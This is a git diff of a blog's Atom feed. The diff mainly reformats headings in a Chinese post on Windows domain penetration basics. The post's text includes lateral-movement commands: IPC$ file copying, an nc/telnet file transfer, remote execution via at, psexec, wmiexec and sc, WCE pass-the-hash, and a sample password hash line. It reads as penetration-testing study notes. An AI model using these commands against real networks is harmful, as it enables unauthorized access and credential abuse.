@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.izilong.net/"/>
-  <updated>2017-01-24T06:55:07.000Z</updated>
+  <updated>2017-01-24T06:56:22.000Z</updated>
   <id>http://blog.izilong.net/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://blog.izilong.net/2017/01/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
     <id>http://blog.izilong.net/2017/01/24/域渗透基础知识/</id>
     <published>2017-01-24T04:07:41.000Z</published>
-    <updated>2017-01-24T06:55:07.000Z</updated>
+    <updated>2017-01-24T06:56:22.000Z</updated>
     
     <content type="html"><![CDATA[<p>之前写过一篇内网当中域渗透的简单文章。好久没遇到忘得差不多了。前几天做项目，正好碰到了域环境，正好有时间，再回顾一下原来的知识，另外把新补充的知识再记录一下。</p>
 <h2 id="域相关知识"><a href="#域相关知识" class="headerlink" title="域相关知识"></a>域相关知识</h2><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。<br>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p>
@@ -56,8 +56,7 @@
 <li>命令输入错误.</li>
 <li>用户名或密码错误. </li>
 </ol>
-<p>###常见错误号：</p>
-<ol>
+<h3 id="常见错误号："><a href="#常见错误号：" class="headerlink" title="常见错误号："></a>常见错误号：</h3><ol>
 <li>错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限； </li>
 <li>错误号51，Windows 无法找到网络路径 : 网络有问题； </li>
 <li>错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； </li>
@@ -66,18 +65,16 @@
 <li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li>
 <li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li>
 </ol>
-<p>##域内的文件操作</p>
-<p>####利用IPC$<br>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
+<h2 id="域内的文件操作"><a href="#域内的文件操作" class="headerlink" title="域内的文件操作"></a>域内的文件操作</h2><h4 id="利用IPC"><a href="#利用IPC" class="headerlink" title="利用IPC$"></a>利用IPC$</h4><p>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</p>
 <p>上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。</p>
 <p>何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。</p>
 <p>如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是<br><code>copy 1.bat \\192.168.1.2\C$\</code></p>
 <p>反之就是下载。dir、copy、xcopy、move、type的参数都可以使用UNC路径。</p>
-<p>####利用Telnet<br>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
+<h4 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h4><p>服务端：<code>nc -lvp 23 &lt; nc.exe</code></p>
 <p>下载端：<code>telnet ip -f c:\nc.exe</code></p>
-<p>####利用文件共享<br>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
-<p>##域内运行命令</p>
-<p>###利用计划任务<br><code>at \\192.168.200.100 15:00 c:\hack.bat</code></p>
-<p>###psexec<br>psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用psexec \192.168.200.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。<br>参数：</p>
+<h4 id="利用文件共享"><a href="#利用文件共享" class="headerlink" title="利用文件共享"></a>利用文件共享</h4><p>映射目标<br><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></p>
+<h2 id="域内运行命令"><a href="#域内运行命令" class="headerlink" title="域内运行命令"></a>域内运行命令</h2><h3 id="利用计划任务"><a href="#利用计划任务" class="headerlink" title="利用计划任务"></a>利用计划任务</h3><p><code>at \\192.168.200.100 15:00 c:\hack.bat</code></p>
+<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用psexec \192.168.200.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。<br>参数：</p>
 <blockquote>
 <p>-s 参数用来以system权限执行</p>
 <p>–accepteula 绕过第一次运行的弹窗</p>
@@ -85,17 +82,21 @@
 <p>-d 不等待程序执行完就返回</p>
 </blockquote>
 <p><code>psexec \\192.168.1.2 c:\hack.bat</code></p>
-<p>###wmiexec<br>T00ls大牛写的一款工具。早就传开了。<br>半交互模式：<br><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</code></p>
+<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>T00ls大牛写的一款工具。早就传开了。<br>半交互模式：<br><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</code></p>
 <p>单个命令执行的模式：<br><code>cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;</code></p>
 <p>如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>
 <pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1  
 wce -s [hash] 
 cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
-</code></pre><p>###SC创建服务执行<br>    1、系统权限(其中test为服务名)<br>    sc \DC1 create test binpath= c:\cmd.exe<br>    sc \DC1 start test<br>    sc \DC1 delete test</p>
-<pre><code>2.指定用户权限启动
+</code></pre><h3 id="SC创建服务执行"><a href="#SC创建服务执行" class="headerlink" title="SC创建服务执行"></a>SC创建服务执行</h3><pre><code>1、系统权限(其中test为服务名)
+sc \\DC1 create test binpath= c:\cmd.exe
+sc \\DC1 start test
+sc \\DC1 delete test
+
+2.指定用户权限启动
 sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test
 sc \\DC1 start test
-</code></pre><p>##hash相关知识<br>windows的密码是经过hash后存储的，本地存在sam，system注册表中，域里面存在ntds.dit中。密码hash有两种格式，LM hash和NT hash。</p>
+</code></pre><h2 id="hash相关知识"><a href="#hash相关知识" class="headerlink" title="hash相关知识"></a>hash相关知识</h2><p>windows的密码是经过hash后存储的，本地存在sam，system注册表中，域里面存在ntds.dit中。密码hash有两种格式，LM hash和NT hash。</p>
 <p>| 2000 | xp | 2003 | Vista | win7 | 2008 | 2012 | </p>
 <p>前面三个默认是LM hash,当密码超过14位时候会采用NTLM加密 </p>
 <p><code>test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</code></p>
